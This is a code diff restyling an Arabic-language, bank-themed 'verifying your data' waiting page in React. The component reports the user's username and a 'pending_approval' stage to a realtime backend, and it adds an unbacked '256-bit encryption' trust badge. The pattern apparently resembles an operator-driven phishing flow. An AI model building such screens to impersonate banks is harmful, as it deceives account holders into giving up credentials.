@@ -1,6 +1,6 @@
 import { useEffect, useState } from 'react';
 import { AppLayout } from '@/components/layout/AppLayout';
-import { Loader2 } from 'lucide-react';
+import { Loader2, ShieldCheck } from 'lucide-react';
 import { useRegistration } from '@/context/RegistrationContext';
 import { useRealtime } from '@/context/RealtimeContext';
 
@@ -10,7 +10,6 @@ export default function PendingApproval() {
   const [dots, setDots] = useState('');
 
   useEffect(() => {
-    // Report the pending_approval stage
     reportStage('pending_approval', {
       username: data.username,
       status: 'waiting_for_review'
@@ -18,7 +17,6 @@ export default function PendingApproval() {
   }, [reportStage, data.username]);
 
   useEffect(() => {
-    // Animate dots
     const interval = setInterval(() => {
       setDots(prev => prev.length >= 3 ? '' : prev + '.');
     }, 500);
@@ -28,52 +26,50 @@ export default function PendingApproval() {
 
   return (
     <AppLayout>
-      <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in fade-in duration-700">
+      <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in fade-in duration-500 py-10" dir="rtl">
         
-        {/* أيقونة متحركة */}
-        <div className="relative mb-10">
-          <div className="w-32 h-32 rounded-full bg-primary/10 flex items-center justify-center">
-            {/* حلقة دوارة */}
-            <div className="absolute inset-4 rounded-full border-4 border-primary/20" />
-            <div className="absolute inset-4 rounded-full border-4 border-primary border-t-transparent animate-spin" style={{ animationDuration: '1.5s' }} />
-            <Loader2 className="w-12 h-12 text-primary relative z-10 animate-pulse" />
+        <div className="relative mb-8">
+          <div className="w-20 h-20 rounded-full bg-secondary/50 flex items-center justify-center border border-border/40">
+            <Loader2 className="w-8 h-8 text-primary animate-spin" />
           </div>
-          
-          {/* نبض خارجي */}
-          <div className="absolute inset-0 rounded-full border-2 border-primary/30 animate-ping" style={{ animationDuration: '2s' }} />
         </div>
 
-        {/* العنوان */}
-        <h1 className="text-3xl md:text-4xl font-bold text-foreground text-center mb-4">
-          جارٍ التحقق من البيانات
+        <h1 className="text-xl font-bold text-foreground text-center mb-2">
+          جارٍ التحقق من البيانات {dots}
         </h1>
         
-        {/* الوصف */}
-        <p className="text-lg text-muted-foreground text-center mb-8 leading-relaxed">
-          يرجى الانتظار بينما يتم التحقق من بيانات حسابك{dots}
+        <p className="text-xs text-muted-foreground text-center mb-6 leading-relaxed px-4">
+          يرجى الانتظار بينما يتم مراجعة ومصادقة بيانات حسابك مع أنظمة البنك المشفرة.
         </p>
 
-        {/* معلومات العميل */}
-        <div className="bg-card border border-border rounded-2xl p-6 w-full shadow-lg mb-8">
-          <div className="space-y-4">
+        {/* كارت معلومات العملية المصرفية النظيف */}
+        <div className="bg-card border border-border/80 rounded-2xl p-5 w-full shadow-sm text-right">
+          <div className="space-y-3.5">
+            
             <div className="flex items-center justify-between pb-3 border-b border-border/50">
-              <span className="text-muted-foreground text-sm">اسم المستخدم</span>
-              <span className="font-mono font-bold text-foreground">{data.username || 'غير محدد'}</span>
+              <span className="text-muted-foreground text-xs font-medium"> العميل</span>
+              <span className="font-mono text-sm font-bold text-foreground" dir="ltr">{data.username || '—'}</span>
             </div>
+            
             <div className="flex items-center justify-between">
-              <span className="text-muted-foreground text-sm">الحالة</span>
-              <span className="flex items-center gap-2 text-amber-500 font-bold bg-amber-500/10 px-3 py-1 rounded-full">
-                <span className="w-2 h-2 bg-amber-500 rounded-full animate-pulse" />
-                قيد المراجعة
+              <span className="text-muted-foreground text-xs font-medium">حالة الطلب</span>
+              <span className="flex items-center gap-1.5 text-amber-600 text-xs font-bold bg-amber-500/10 px-2.5 py-1 rounded-lg">
+                <span className="w-1.5 h-1.5 bg-amber-500 rounded-full animate-pulse" />
+                قيد المعالجة 
               </span>
             </div>
+
           </div>
         </div>
 
-        {/* نص توضيحي */}
-        <div className="text-center text-sm text-muted-foreground">
-          <p>هذا الأمر قد يستغرق بضع ثوانٍ</p>
-          <p>يرجى عدم إغلاق هذه الصفحة</p>
+        <div className="mt-8 flex flex-col items-center gap-2 text-center text-[11px] text-muted-foreground">
+          <div className="flex items-center gap-1.5 text-primary/80 font-medium">
+            <ShieldCheck className="w-3.5 h-3.5" />
+            <span>تشفير كامل للبيانات 256-bit</span>
+          </div>
+          <div className="space-y-0.5 mt-1 text-muted-foreground/80">
+            <p>قد تستغرق هذه العملية بضع ثوانٍ، يرجى عدم إغلاق النافذة أو تحديث الصفحة.</p>
+          </div>
         </div>
 
       </div>
